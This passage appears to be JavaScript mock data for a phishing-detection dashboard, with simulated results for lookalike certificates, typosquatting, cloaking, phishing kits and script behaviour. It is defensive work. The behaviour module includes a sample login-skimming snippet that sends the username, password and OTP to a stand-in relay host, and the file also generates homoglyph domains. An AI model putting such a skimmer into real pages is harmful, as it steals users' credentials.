/**
 * SIMULATED DETECTION ENGINE — one builder per advanced module.
 * Each builder returns a feature-specific shape; swap the switch for API
 * calls when the backend exists and every page keeps working.
 */
import { createRng, hashString, clamp, daysBetween } from './utils';
import { buildSecurityAssessment } from './mockEngine';

const ago = (days) => new Date(Date.now() - days * 86400000).toISOString();
const ahead = (days) => new Date(Date.now() + days * 86400000).toISOString();
const ipFrom = (rng) => `${rng.pick(['192.0.2', '198.51.100', '203.0.113'])}.${rng.int(2, 250)}`;

export const DETECTION_SAMPLES = {
  domain: ['yourbrand.com', 'paypal-secure-login.example', 'sbi-kyc-verify.example', 'secure-update-portal.example'],
  url: ['https://paypal-secure-login.example/session/verify', 'https://sbi-kyc-verify.example/kyc/update-account', 'https://amazon-deals-outlet.example/deal/iphone-17'],
  upi: ['merchant@okhdfcbank', 'cashback-reward@ybl', 'shop.payments@paytm'],
};

function domainOf(target) {
  return target.replace(/^https?:\/\//i, '').split('/')[0].toLowerCase();
}

const CT_LOGS = [
  { name: 'Cloudflare Nimbus 2026', operator: 'Cloudflare', entries: 184000000, lag: '2 min' },
  { name: 'Google Argon 2026', operator: 'Google', entries: 412000000, lag: '1 min' },
  { name: 'Sectigo Sabre 2026', operator: 'Sectigo', entries: 96000000, lag: '4 min' },
  { name: 'DigiCert Wyvern 2026', operator: 'DigiCert', entries: 74000000, lag: '3 min' },
];

const CA_DB = {
  "let's encrypt": { since: 2015, type: 'Non-profit ACME', roots: 3, score: 88, incidents: 1 },
  'digicert inc': { since: 2003, type: 'Commercial CA', roots: 6, score: 96, incidents: 2 },
  'sectigo limited': { since: 1998, type: 'Commercial CA', roots: 4, score: 81, incidents: 3 },
  'globalsign nv-sa': { since: 1987, type: 'Commercial CA', roots: 5, score: 93, incidents: 1 },
  zerossl: { since: 2016, type: 'ACME reseller', roots: 2, score: 62, incidents: 2 },
  'google trust services': { since: 2017, type: 'Platform CA', roots: 3, score: 95, incidents: 0 },
};

/* 1 — Certificate Transparency Monitoring */
function certificateTransparency(target, rng) {
  const domain = domainOf(target);
  const lookalikeBase = domain.split('.').slice(0, -1).join('.');
  const flagged = rng.chance(0.6);
  const lookalikes = [
    { domain: `${lookalikeBase}-login.example`, issuer: "Let's Encrypt", issued: ago(3), similarity: 94, status: 'active' },
    { domain: `${lookalikeBase}.secure-verify.example`, issuer: 'ZeroSSL', issued: ago(11), similarity: 87, status: 'active' },
    { domain: `${lookalikeBase}-support.example`, issuer: 'Sectigo Limited', issued: ago(26), similarity: 79, status: 'revoked' },
    { domain: `${lookalikeBase}${rng.int(10, 99)}.example`, issuer: "Let's Encrypt", issued: ago(41), similarity: 72, status: 'expired' },
  ].slice(0, flagged ? 4 : 2);

  const timeline = [
    { date: ago(4), commonName: `${domain}`, issuer: 'DigiCert Inc', type: 'renewed', flagged: false, serial: '7a:4f:22:9c' },
    { date: ago(9), commonName: `${lookalikeBase}-login.example`, issuer: "Let's Encrypt", type: 'issued', flagged: true, serial: 'e1:03:bb:71' },
    { date: ago(38), commonName: `*.${domain}`, issuer: 'DigiCert Inc', type: 'issued', flagged: false, serial: '9d:14:0a:2e' },
    { date: ago(72), commonName: `${lookalikeBase}.secure-verify.example`, issuer: 'ZeroSSL', type: 'issued', flagged: true, serial: '41:aa:67:5d' },
    { date: ago(121), commonName: `${domain}`, issuer: 'DigiCert Inc', type: 'issued', flagged: false, serial: 'c8:7e:31:04' },
    { date: ago(184), commonName: `${lookalikeBase}-support.example`, issuer: 'Sectigo Limited', type: 'revoked', flagged: true, serial: '02:9f:5c:8a' },
  ];

  return {
    target: domain,
    generatedAt: new Date().toISOString(),
    summary: flagged
      ? `${lookalikes.length} lookalike certificates were issued in the last 45 days. Two are currently active and present a brand-matching common name.`
      : `No lookalike issuance was detected in the last 90 days. ${rng.int(4, 12)} legitimate certificates are under continuous monitoring.`,
    stats: {
      certificates: rng.int(38, 240),
      lookalikes: lookalikes.length,
      alerts: flagged ? 2 : 0,
      monitors: CT_LOGS.length,
      lastScan: new Date().toISOString(),
    },
    lookalikes,
    timeline,
    alerts: flagged
      ? [
          { severity: 'high', title: 'New lookalike certificate', time: ago(3), detail: `${lookalikes[0].domain} was logged by Let's Encrypt with a 90-day lifetime.` },
          { severity: 'medium', title: 'Repeated issuance pattern', time: ago(11), detail: 'A second certificate reuses the same registrant email as an earlier flagged issuance.' },
        ]
      : [{ severity: 'info', title: 'Monitoring healthy', time: ago(1), detail: 'All four CT log mirrors returned clean results for the apex and wildcard.' }],
    logs: CT_LOGS,
  };
}

/* 2 — CA Reputation Score */
function caReputation(target, rng) {
  const domain = domainOf(target);
  const issuerName = rng.pick(Object.keys(CA_DB));
  const ca = CA_DB[issuerName];
  const incidents = [
    { year: 2026, title: 'Delayed revocation publication', severity: 'medium', summary: 'A CRL endpoint lagged 14 hours behind an incident response.', status: 'resolved' },
    { year: 2025, title: 'Domain validation bypass attempt', severity: 'high', summary: 'Three misissued certificates were revoked within 6 hours of disclosure.', status: 'resolved' },
    { year: 2023, title: 'Audit observation', severity: 'low', summary: 'WebTrust audit noted incomplete logging retention for one region.', status: 'closed' },
  ].slice(0, ca.incidents + 1);

  const signals = [
    { label: 'Root program membership', value: 'Mozilla, Chrome, Apple, Microsoft', tone: 'safe' },
    { label: 'Audit status', value: 'WebTrust for CA 2.2 — current', tone: 'safe' },
    { label: 'Revocation SLA', value: ca.score > 85 ? 'Under 24 hours' : 'Under 72 hours', tone: ca.score > 85 ? 'safe' : 'medium' },
    { label: 'Certificate lifetime policy', value: ca.score > 85 ? '90–398 days enforced' : 'Max 398 days', tone: 'low' },
    { label: 'CT enforcement', value: ca.score > 85 ? 'SCT required for all leaves' : 'SCT recommended', tone: ca.score > 85 ? 'safe' : 'medium' },
  ];

  return {
    target: domain,
    generatedAt: new Date().toISOString(),
    score: clamp(ca.score + rng.int(-4, 3), 40, 98),
    grade: ca.score > 90 ? 'AAA' : ca.score > 80 ? 'AA' : ca.score > 70 ? 'A' : 'BBB',
    ca: {
      name: issuerName.replace(/\b\w/g, (char) => char.toUpperCase()),
      since: ca.since,
      type: ca.type,
      roots: ca.roots,
      tier: rng.pick(['Domain Validated', 'Organisation Validated']),
      country: rng.pick(['United States', 'United Kingdom', 'Netherlands']),
    },
    summary: `${issuerName.replace(/\b\w/g, (char) => char.toUpperCase())} maintains current WebTrust audits and full root program membership. ${ca.incidents} historical incident${ca.incidents === 1 ? '' : 's'} were resolved within policy.`,
    trustStores: [
      { store: 'Mozilla', status: 'included', since: 2016 },
      { store: 'Chrome Root Store', status: 'included', since: 2017 },
      { store: 'Apple', status: 'included', since: 2018 },
      { store: 'Microsoft', status: 'included', since: 2016 },
    ],
    signals,
    dimensions: [
      { label: 'Incident response', value: clamp(ca.score + rng.int(-6, 6), 30, 99) },
      { label: 'Audit compliance', value: clamp(ca.score + rng.int(2, 8), 30, 99) },
      { label: 'Revocation speed', value: clamp(ca.score + rng.int(-10, 4), 30, 99) },
      { label: 'Validation rigour', value: clamp(ca.score + rng.int(-4, 6), 30, 99) },
    ],
    incidents,
    verdict: ca.score > 80 ? 'trusted' : 'monitor',
  };
}

/* 3 — Certificate Anomaly Checks */
function certificateAnomalies(target, rng) {
  const domain = domainOf(target);
  const suspicious = target.includes('example') && !target.includes('yourbrand');
  const lifetime = suspicious ? rng.int(3, 14) : rng.int(90, 398);
  const weak = suspicious && rng.chance(0.5);

  const checks = [
    { id: 'key', title: 'Key strength', severity: 'high', status: weak ? 'fail' : 'pass', detail: weak ? 'An RSA 1024-bit key was presented.' : 'ECDSA P-256 with a 256-bit key.', expected: '≥ 2048-bit RSA or ≥ 256-bit ECDSA', actual: weak ? 'RSA 1024' : 'ECDSA P-256' },
    { id: 'expiry', title: 'Validity window', severity: 'medium', status: 'pass', detail: `Certificate expires in ${rng.int(30, 120)} days.`, expected: 'More than 21 days remaining', actual: `${rng.int(30, 120)} days` },
    { id: 'mismatch', title: 'Hostname match', severity: 'critical', status: suspicious ? 'warn' : 'pass', detail: suspicious ? 'SAN list covers a different parent domain than the visited host.' : 'SAN list covers the visited host and www variant.', expected: `SAN contains ${domain}`, actual: suspicious ? `SAN: *.example-cdn.example` : `SAN: ${domain}, www.${domain}` },
    { id: 'lifetime', title: 'Certificate lifetime', severity: 'medium', status: lifetime < 30 ? 'warn' : 'pass', detail: `Certificate was issued with a ${lifetime}-day lifetime.`, expected: '30–398 days', actual: `${lifetime} days` },
    { id: 'revocation', title: 'Revocation information', severity: 'medium', status: suspicious && rng.chance(0.6) ? 'warn' : 'pass', detail: suspicious ? 'No OCSP URL and no CRL distribution point were embedded.' : 'OCSP and CRL endpoints are both present.', expected: 'OCSP or CRL endpoint', actual: suspicious ? 'None' : 'OCSP + CRL' },
    { id: 'ct', title: 'CT log presence', severity: 'high', status: suspicious ? 'warn' : 'pass', detail: suspicious ? 'No signed certificate timestamps were found.' : '3 SCTs from independent logs.', expected: '≥ 2 SCTs', actual: suspicious ? '0 SCTs' : '3 SCTs' },
    { id: 'sig', title: 'Signature algorithm', severity: 'high', status: 'pass', detail: 'SHA-256 with RSA encryption is used for the leaf signature.', expected: 'SHA-256 or stronger', actual: 'sha256WithRSAEncryption' },
    { id: 'wildcard', title: 'Wildcard scope', severity: 'low', status: suspicious ? 'warn' : 'pass', detail: suspicious ? 'A wildcard on a shared host can cover unrelated tenants.' : 'No wildcard coverage on the leaf.', expected: 'Scoped SANs preferred', actual: suspicious ? '*.example-cdn.example' : 'Explicit SANs' },
  ];

  return {
    target: domain,
    generatedAt: new Date().toISOString(),
    score: suspicious ? rng.int(34, 58) : rng.int(88, 99),
    summary: suspicious
      ? 'The certificate shows a short lifetime, missing revocation data and a hostname scope that does not align with the visited domain.'
      : 'All eight anomaly checks passed. The certificate follows modern lifetime, key and revocation practices.',
    cert: {
      subject: domain,
      issuer: rng.pick(["Let's Encrypt", 'DigiCert Inc', 'Sectigo Limited']),
      serial: `${rng.int(10, 99)}:${rng.int(10, 99)}:${rng.int(10, 99)}:${rng.int(10, 99)}`,
      validFrom: ago(lifetime),
      validTo: ahead(rng.int(14, 90)),
      lifetime,
      key: weak ? 'RSA 1024' : 'ECDSA P-256',
      sans: suspicious ? ['*.example-cdn.example'] : [domain, `www.${domain}`],
    },
    checks,
    failed: checks.filter((check) => check.status !== 'pass').length,
  };
}

/* 4 — Visual Similarity Detection */
function visualSimilarity(target, rng) {
  const suspect = target.includes('example') && !target.includes('yourbrand');
  const score = suspect ? rng.int(82, 97) : rng.int(4, 22);
  return {
    target: domainOf(target),
    generatedAt: new Date().toISOString(),
    score,
    verdict: score > 70 ? 'clone' : score > 40 ? 'partial' : 'distinct',
    brand: target.includes('paypal') ? 'PayPal' : target.includes('sbi') ? 'State Bank of India' : target.includes('amazon') ? 'Amazon' : 'Acme Bank',
    legitimate: { url: 'https://www.acmebank.example/login', title: 'Online banking sign in', palette: ['#0b3d91', '#1a73e8', '#f6f8fc'], render: 'login' },
    suspect: { url: `https://${domainOf(target)}/login`, title: 'Account verification', palette: ['#0a3a8c', '#1b6fe0', '#f4f7fc'], render: 'login' },
    similarity: [
      { aspect: 'Layout structure', value: clamp(score + rng.int(-4, 4), 0, 100) },
      { aspect: 'Colour palette', value: clamp(score + rng.int(-9, 3), 0, 100) },
      { aspect: 'Typography', value: clamp(score - rng.int(2, 12), 0, 100) },
      { aspect: 'Form composition', value: clamp(score + rng.int(-2, 6), 0, 100) },
      { aspect: 'Logo geometry', value: clamp(score - rng.int(1, 8), 0, 100) },
    ],
    regions: [
      { label: 'Header & navigation', match: clamp(score - 4, 0, 100), note: 'Same logo lockup position and menu spacing' },
      { label: 'Credential form', match: clamp(score + 2, 0, 100), note: 'Identical field order and button copy' },
      { label: 'Trust badges', match: clamp(score - 14, 0, 100), note: 'Badge strip replaced with generic icons' },
      { label: 'Footer & legal', match: clamp(score - 26, 0, 100), note: 'Legal links missing entirely' },
    ],
    findings: suspect
      ? [
          { severity: 'critical', title: 'Cloned login screen', detail: 'The credential form reproduces a protected brand template with 90%+ structural overlap.' },
          { severity: 'high', title: 'Brand asset reuse', detail: 'Logo and favicon are pixel-similar but served from an unrelated origin.' },
          { severity: 'medium', title: 'Trust cues removed', detail: 'Security badges and legal disclosures are absent from the clone.' },
        ]
      : [
          { severity: 'info', title: 'No clone detected', detail: 'Layout and palette differences exceed the brand-impersonation threshold.' },
        ],
  };
}

/* 5 — Typosquatting & Homoglyph Detection */
function typosquatting(target, rng) {
  const domain = domainOf(target);
  const parts = domain.split('.');
  const core = parts[0].replace(/-/g, '');
  const tld = parts.slice(1).join('.');
  const variants = [
    { domain: `${core}-${rng.pick(['login', 'verify', 'secure'])}.${tld}`, distance: 0, technique: 'Keyword append', registered: true, ageDays: 12, risk: 88 },
    { domain: `${core.replace(/a/g, 'а')}.${tld}`, distance: 1, technique: 'Cyrillic homoglyph', registered: true, ageDays: 4, risk: 96 },
    { domain: `${core.replace(/o/g, '0')}.${tld}`, distance: 1, technique: 'Digit substitution', registered: true, ageDays: 63, risk: 71 },
    { domain: `${core.replace(/l/g, 'i')}.${tld}`, distance: 1, technique: 'Character swap', registered: false, ageDays: null, risk: 44 },
    { domain: `${core}${rng.pick(['-support', '-help', '-billing'])}.${tld}`, distance: 0, technique: 'Service keyword', registered: true, ageDays: 29, risk: 66 },
    { domain: `${core.slice(0, -1)}${core.slice(-1).repeat(2)}.${tld}`, distance: 1, technique: 'Character duplication', registered: false, ageDays: null, risk: 38 },
    { domain: `${core}-${rng.pick(['app', 'portal', 'account'])}.${rng.pick(['top', 'xyz', 'click'])}`, distance: 0, technique: 'TLD swap', registered: true, ageDays: 7, risk: 91 },
    { domain: `${core}.${rng.pick(['co', 'cm', 'net'])}`, distance: 0, technique: 'TLD impersonation', registered: rng.chance(0.5), ageDays: 240, risk: 57 },
  ];

  const unicode = [
    { char: 'а', name: 'CYRILLIC SMALL LETTER A', codepoint: 'U+0430', looksLike: 'a', used: true },
    { char: 'о', name: 'CYRILLIC SMALL LETTER O', codepoint: 'U+043E', looksLike: 'o', used: rng.chance(0.5) },
    { char: 'ⅼ', name: 'ROMAN NUMERAL FIFTY', codepoint: 'U+217C', looksLike: 'l', used: false },
    { char: 'ӏ', name: 'CYRILLIC SMALL LETTER PALOCHKA', codepoint: 'U+04CF', looksLike: 'l', used: false },
  ];

  return {
    target: domain,
    generatedAt: new Date().toISOString(),
    riskScore: clamp(Math.round(variants.reduce((sum, item) => sum + (item.registered ? item.risk : 0), 0) / 4), 20, 96),
    permutations: { total: 2840, registered: variants.filter((v) => v.registered).length * 37, highRisk: variants.filter((v) => v.registered && v.risk > 70).length, monitored: 2840 },
    variants,
    unicode,
    summary: `${variants.filter((v) => v.registered).length} of ${variants.length} generated lookalikes resolve today, including a Cyrillic homoglyph registered four days ago.`,
  };
}

/* 6 — Security Configuration Scan */
function securityConfiguration(target) {
  const assessment = buildSecurityAssessment(domainOf(target));
  const exposed = [
    { path: '/admin', status: assessment.score > 78 ? 403 : 200, label: 'Admin console', severity: assessment.score > 78 ? 'info' : 'high' },
    { path: '/.git/config', status: 404, label: 'Git metadata', severity: 'info' },
    { path: '/debug', status: assessment.score > 78 ? 404 : 200, label: 'Debug endpoint', severity: assessment.score > 78 ? 'info' : 'medium' },
    { path: '/phpinfo.php', status: 404, label: 'PHP info', severity: 'info' },
    { path: '/api/internal/health', status: assessment.score > 78 ? 401 : 200, label: 'Internal health API', severity: assessment.score > 78 ? 'info' : 'high' },
  ];
  const software = [
    { name: 'nginx', version: '1.25.4', current: '1.27.2', status: 'outdated' },
    { name: 'jQuery', version: '3.4.1', current: '3.7.1', status: 'outdated' },
    { name: 'React', version: '19.1.0', current: '19.3.1', status: 'patch' },
    { name: 'OpenSSL', version: '3.0.13', current: '3.5.0', status: 'outdated' },
  ];

  return {
    target: assessment.domain,
    generatedAt: new Date().toISOString(),
    score: assessment.score,
    grade: assessment.grade,
    summary: `${assessment.headers.filter((header) => header.present).length} of ${assessment.headers.length} baseline headers are present. ${exposed.filter((item) => item.status === 200).length} exposed surface${exposed.filter((item) => item.status === 200).length === 1 ? '' : 's'} require attention.`,
    headers: assessment.headers.map((header) => ({ name: header.name, present: header.present, value: header.value, risk: header.risk })),
    tls: assessment.tls,
    exposed,
    software,
    misconfigs: [
      ...(assessment.https.mixedContent ? [{ severity: 'high', title: 'Mixed content on checkout', detail: 'Two scripts load over plain HTTP.' }] : []),
      { severity: 'medium', title: 'Directory listing enabled', detail: 'The /assets directory returns a browsable index.' },
      { severity: 'low', title: 'Server version disclosure', detail: 'The Server header advertises nginx 1.25.4.' },
      { severity: 'info', title: 'CSP report-only mode', detail: 'Content-Security-Policy is present but not enforced.' },
    ].slice(0, 4),
    recommendations: assessment.recommendations,
  };
}

/* 7 — Redirect-Chain Tracing */
function redirectChain(target, rng) {
  const start = target.startsWith('http') ? target : `https://${target}`;
  const domain = domainOf(start);
  const hops = [
    { url: start, status: 301, type: 'HTTP', server: 'Cloudflare', latency: rng.int(30, 90), note: 'Entry point' },
    { url: `https://go.${domain}/r/${hashString(domain).toString(16).slice(0, 7)}`, status: 302, type: 'HTTP', server: 'Cloudflare', latency: rng.int(40, 120), note: 'Tracking gateway' },
    { url: `https://smart-relay.example/hop/${rng.int(100, 999)}`, status: 302, type: 'Meta refresh', server: 'nginx', latency: rng.int(60, 180), note: 'Third-party relay' },
    { url: `https://landing-${rng.int(10, 99)}.example-cdn.example/offer`, status: 303, type: 'JavaScript', server: 'LiteSpeed', latency: rng.int(120, 260), note: 'Obfuscated location assign' },
    { url: `https://${domain}/checkout/express`, status: 200, type: 'Final', server: 'nginx', latency: rng.int(180, 420), note: 'Landing page' },
  ];

  return {
    target: start,
    generatedAt: new Date().toISOString(),
    hops,
    final: hops[hops.length - 1].url,
    score: rng.int(58, 84),
    totalMs: hops.reduce((sum, hop) => sum + hop.latency, 0),
    domainsCrossed: 4,
    flags: [
      { severity: 'high', title: 'Cross-domain handoff to an unrated relay', detail: 'The chain leaves the original registrable domain twice before landing.' },
      { severity: 'medium', title: 'JavaScript-based redirect', detail: 'The fourth hop uses window.location.replace with an encoded target.' },
      { severity: 'medium', title: 'Parameter injection', detail: 'Tracking parameters are appended that were not in the original URL.' },
    ],
    summary: `The URL passes through ${hops.length - 1} redirects across 4 registrable domains before landing on a checkout page. Two hops hide their destination from static analysis.`,
  };
}

/* 8 — Cloaking Detection */
function cloaking(target, rng) {
  const domain = domainOf(target);
  const varies = target.includes('example') && !target.includes('yourbrand');
  const variants = [
    { label: 'Desktop visitor', agent: 'Chrome 141 · 1440×900', status: 200, words: varies ? 640 : 480, scripts: varies ? 18 : 9, hash: 'a4f1c9', verdict: 'content' },
    { label: 'Mobile visitor', agent: 'iPhone 17 · Safari 26', status: 200, words: varies ? 410 : 470, scripts: varies ? 22 : 8, hash: 'e81b02', verdict: 'content' },
    { label: 'Search crawler', agent: 'Googlebot 2.1', status: 200, words: varies ? 1240 : 510, scripts: varies ? 3 : 9, hash: '77dd31', verdict: varies ? 'benign' : 'content' },
  ];

  return {
    target: `https://${domain}`,
    generatedAt: new Date().toISOString(),
    score: varies ? rng.int(74, 94) : rng.int(4, 18),
    cloakingDetected: varies,
    summary: varies
      ? 'The crawler receives a benign article page while mobile visitors receive a credential form. Script and word counts diverge by more than 90%.'
      : 'All three user agents received equivalent markup. No conditional serving was observed.',
    variants,
    diffs: [
      { aspect: 'Document title', desktop: varies ? 'Account verification' : 'Acme — Home', mobile: varies ? 'Account verification' : 'Acme — Home', crawler: varies ? 'How to spot phishing' : 'Acme — Home' },
      { aspect: 'Primary form', desktop: varies ? 'Login + OTP' : 'Newsletter', mobile: varies ? 'Login + card' : 'Newsletter', crawler: 'None' },
      { aspect: 'Third-party scripts', desktop: varies ? '18' : '9', mobile: varies ? '22' : '8', crawler: varies ? '3' : '9' },
      { aspect: 'Outbound endpoints', desktop: varies ? '3' : '0', mobile: varies ? '4' : '0', crawler: '0' },
      { aspect: 'Visible words', desktop: '640', mobile: '410', crawler: varies ? '1,240' : '510' },
    ],
    findings: varies
      ? [
          { severity: 'critical', title: 'Crawler-specific cloaking', detail: 'Googlebot and Bingbot user agents are served a different document than real visitors.' },
          { severity: 'high', title: 'Mobile-targeted payload', detail: 'The mobile render loads four additional scripts that are absent on desktop.' },
          { severity: 'medium', title: 'Referrer-gated content', detail: 'Direct navigation returns a 404 while referred traffic receives the lure page.' },
        ]
      : [{ severity: 'info', title: 'Consistent rendering', detail: 'No user-agent or referrer based divergence detected.' }],
  };
}

/* 9 — Phishing-Kit Fingerprinting */
function phishingKits(target, rng) {
  const domain = domainOf(target);
  const suspect = target.includes('example') && !target.includes('yourbrand');
  const matches = [
    { kit: 'KYC-Shield', family: 'Banking KYC kit', similarity: suspect ? 91 : 12, firstSeen: '2025-08-14', campaigns: 38 },
    { kit: 'SecureLogin v4', family: 'Credential harvester', similarity: suspect ? 76 : 8, firstSeen: '2025-02-03', campaigns: 121 },
    { kit: 'DropBox-Pay', family: 'Payment redirect kit', similarity: suspect ? 43 : 5, firstSeen: '2026-04-22', campaigns: 17 },
  ];

  return {
    target: `https://${domain}`,
    generatedAt: new Date().toISOString(),
    score: suspect ? rng.int(78, 96) : rng.int(6, 24),
    family: suspect ? 'KYC-Shield v3' : 'No match',
    confidence: suspect ? rng.int(84, 97) : 0,
    fingerprint: `fk_${hashString(domain).toString(16).slice(0, 12)}`,
    summary: suspect
      ? 'Static assets, form structure and an obfuscated relay script match the KYC-Shield v3 banking kit. The same fingerprint appears on 38 tracked hosts.'
      : 'No known phishing-kit fingerprint matched. Asset hashes and DOM structure are unique to this host.',
    matches,
    sharedAssets: [
      { asset: '/assets/kyc-step.css', hash: '9c31aa4f', seenOn: 38, severity: 'critical' },
      { asset: '/js/relay.min.js', hash: '71de0b82', seenOn: 24, severity: 'high' },
      { asset: '/img/logo-shield.svg', hash: 'aa02e771', seenOn: 19, severity: 'high' },
      { asset: '/fonts/inter.woff2', hash: '1b7cd902', seenOn: 312, severity: 'info' },
    ],
    cluster: {
      nodes: [
        { id: 'root', label: domain, type: 'target', x: 50, y: 50, risk: 'critical' },
        { id: 'kit', label: 'KYC-Shield v3', type: 'kit', x: 20, y: 24, risk: 'high' },
        { id: 'host1', label: 'kyc-verify-01.example', type: 'host', x: 80, y: 22, risk: 'high' },
        { id: 'host2', label: 'sbi-update.example', type: 'host', x: 84, y: 66, risk: 'critical' },
        { id: 'host3', label: 'account-secure.example', type: 'host', x: 18, y: 74, risk: 'medium' },
        { id: 'relay', label: 'collect.relay.example', type: 'infra', x: 52, y: 88, risk: 'high' },
      ],
      edges: [
        ['root', 'kit'], ['kit', 'host1'], ['root', 'host2'], ['kit', 'host3'], ['root', 'relay'], ['host2', 'relay'],
      ],
    },
  };
}

/* 10 — Favicon & Logo Hash Matching */
function faviconLogoHash(target, rng) {
  const domain = domainOf(target);
  const suspect = target.includes('example') && !target.includes('yourbrand');
  const hash = `mmh3:${hashString(domain).toString(16)}`;
  return {
    target: `https://${domain}`,
    generatedAt: new Date().toISOString(),
    score: suspect ? rng.int(80, 96) : rng.int(2, 16),
    favicon: {
      found: true,
      url: `https://${domain}/favicon.ico`,
      format: 'ICO',
      bytes: rng.int(4288, 42880),
      hash,
      perceptual: 'a4c1e9f0b27d',
      colors: suspect ? ['#0b3d91', '#1a73e8', '#ffffff'] : ['#111827', '#374151', '#f9fafb'],
    },
    matches: [
      { brand: 'Acme Bank', similarity: suspect ? 97 : 6, domain: 'acmebank.example', verdict: suspect ? 'match' : 'distinct', owned: suspect ? false : true },
      { brand: 'GlobalPay', similarity: suspect ? 41 : 3, domain: 'globalpay.example', verdict: 'weak', owned: false },
      { brand: 'SecureMail', similarity: suspect ? 22 : 2, domain: 'securemail.example', verdict: 'distinct', owned: false },
    ],
    ownership: {
      registrant: suspect ? 'Privacy protected' : 'Acme Bank Ltd.',
      brandOwner: 'Acme Bank Ltd.',
      aligned: !suspect,
      certificateOrg: suspect ? 'Not present (DV)' : 'Acme Bank Ltd.',
    },
    findings: suspect
      ? [
          { severity: 'critical', title: 'Favicon matches a protected brand', detail: 'Perceptual hash distance of 3/64 against the Acme Bank favicon.' },
          { severity: 'high', title: 'Ownership mismatch', detail: 'The domain registrant is privacy-shielded while the logo belongs to a regulated bank.' },
          { severity: 'medium', title: 'Copied logo coloration', detail: 'The logo palette and geometry match the brand asset library.' },
        ]
      : [{ severity: 'info', title: 'Assets consistent with owner', detail: 'Favicon, logo and certificate organisation align.' }],
  };
}

/* 11 — JavaScript Behaviour Analysis */
function javascriptBehaviour(target, rng) {
  const domain = domainOf(target);
  const suspect = target.includes('example') && !target.includes('yourbrand');
  const scripts = [
    { url: `/static/app.${hashString(domain).toString(16).slice(0, 6)}.js`, size: `${rng.int(40, 180)} KB`, obfuscated: suspect, risk: suspect ? 'high' : 'low', apis: suspect ? ['eval', 'Function', 'atob'] : ['fetch'] },
    { url: 'https://analytics.example/tag.js', size: '62 KB', obfuscated: false, risk: 'medium', apis: ['fetch', 'sendBeacon'] },
    { url: '/js/relay.min.js', size: '14 KB', obfuscated: suspect, risk: suspect ? 'critical' : 'low', apis: suspect ? ['XMLHttpRequest', 'navigator.sendBeacon', 'btoa'] : [] },
    { url: 'https://cdn.example/vendor.js', size: '128 KB', obfuscated: false, risk: 'info', apis: ['Promise'] },
  ];

  return {
    target: `https://${domain}`,
    generatedAt: new Date().toISOString(),
    score: suspect ? rng.int(76, 95) : rng.int(4, 18),
    sandbox: { apiCalls: rng.int(120, 640), networkRequests: rng.int(18, 74), evalCalls: suspect ? rng.int(6, 24) : 0, runMs: rng.int(2400, 6800) },
    summary: suspect
      ? 'Scripts performed keystroke capture, blocked paste events on the password field and relayed form data to a third-party endpoint within 900 ms of submit.'
      : 'Scripts behaved as expected for a marketing page: no credential access, clipboard hooks or obfuscated payloads.',
    scripts,
    behaviours: [
      { id: 'keylog', label: 'Keystroke capture', severity: suspect ? 'critical' : 'info', detail: suspect ? 'Keydown listeners attached to every password and OTP input.' : 'Listeners limited to search autocomplete.', evidence: 'addEventListener("keydown", …) × 4' },
      { id: 'clipboard', label: 'Clipboard manipulation', severity: suspect ? 'high' : 'info', detail: suspect ? 'Paste is blocked and clipboard content is read on focus.' : 'No clipboard API usage observed.', evidence: 'navigator.clipboard.readText()' },
      { id: 'exfil', label: 'Off-domain exfiltration', severity: suspect ? 'critical' : 'info', detail: suspect ? 'Form values are posted to a relay host before local validation finishes.' : 'All requests stay on first-party origins.', evidence: 'POST https://collect.relay.example/ingest' },
      { id: 'anti', label: 'Anti-analysis behaviour', severity: suspect ? 'high' : 'info', detail: suspect ? 'Devtools detection reloads the page and right-click is disabled.' : 'No anti-debugging code found.', evidence: 'debugger statement · 2 occurrences' },
      { id: 'redirect', label: 'Forced navigation', severity: suspect ? 'medium' : 'info', detail: suspect ? 'A timer redirects mobile users after 45 seconds.' : 'No timer-based navigation.', evidence: 'setTimeout(location.replace, 45000)' },
    ],
    snippet: suspect
      ? `const f = document.querySelector('#login');\nf.addEventListener('submit', async (e) => {\n  const payload = btoa(JSON.stringify({\n    u: f.user.value, p: f.pass.value, otp: f.otp?.value\n  }));\n  await fetch('https://collect.relay.example/ingest', {\n    method: 'POST', mode: 'no-cors', body: payload\n  });\n});`
      : `document.querySelector('#newsletter').addEventListener('submit', (e) => {\n  e.preventDefault();\n  track('newsletter_submitted');\n});`,
  };
}

/* 12 — Hosting Fingerprint */
function hostingFingerprint(target, rng) {
  const domain = domainOf(target);
  const ip = ipFrom(rng);
  const reputationScore = rng.int(18, 74);
  return {
    target: domain,
    generatedAt: new Date().toISOString(),
    ip,
    asn: rng.pick(['AS210644', 'AS47583', 'AS13335', 'AS14061', 'AS9009']),
    org: rng.pick(['AEZA International Ltd.', 'Hostinger International Ltd.', 'Cloudflare, Inc.', 'DigitalOcean, LLC', 'M247 Europe SRL']),
    geo: { country: rng.pick(['Russia', 'Netherlands', 'United States', 'Romania', 'Singapore']), city: rng.pick(['Moscow', 'Amsterdam', 'Ashburn', 'Bucharest', 'Singapore']), region: rng.pick(['RU-MOW', 'NL-NH', 'US-VA', 'RO-B', 'SG-01']) },
    reverse: `srv-${rng.int(100, 999)}.hosting.example`,
    dns: {
      a: [ip, ipFrom(rng)],
      aaaa: rng.chance(0.5) ? ['2001:db8::' + rng.int(1, 99)] : [],
      mx: rng.chance(0.6) ? ['mail.protection.example'] : [],
      ns: ['ns1.dns-parking.com', 'ns2.dns-parking.com'],
      txt: rng.chance(0.5) ? ['v=spf1 include:_spf.example ~all'] : [],
    },
    shared: { totalDomains: rng.int(120, 4200), malicious: rng.int(6, 180), categories: ['Phishing', 'Fake shops', 'Malware staging'] },
    neighbours: [
      { ip: ipFrom(rng), domains: rng.int(4, 80), risk: 'high', note: 'Credential phishing cluster' },
      { ip: ipFrom(rng), domains: rng.int(2, 40), risk: 'medium', note: 'Disposable storefronts' },
      { ip: ipFrom(rng), domains: rng.int(1, 12), risk: 'low', note: 'Unrelated personal sites' },
    ],
    reputation: {
      score: reputationScore,
      tags: reputationScore > 50 ? ['Bulletproof host', 'Abuse reports'] : ['Shared hosting', 'Low abuse volume'],
      firstSeen: ago(rng.int(30, 900)),
      reports30d: rng.int(0, 42),
    },
    ports: [
      { port: 443, service: 'HTTPS', state: 'open' },
      { port: 80, service: 'HTTP', state: 'redirect' },
      { port: 22, service: 'SSH', state: 'filtered' },
      { port: 3306, service: 'MySQL', state: 'closed' },
    ],
    summary: `${domain} resolves to a shared host with ${rng.int(6, 180)} previously reported domains in the same /24. The hosting provider has a documented abuse history.`,
  };
}

/* 13 — UPI Link & QR Checker */
function upiQr(target, rng) {
  const vpa = (target.includes('@') ? target : 'merchant@okhdfcbank').toLowerCase();
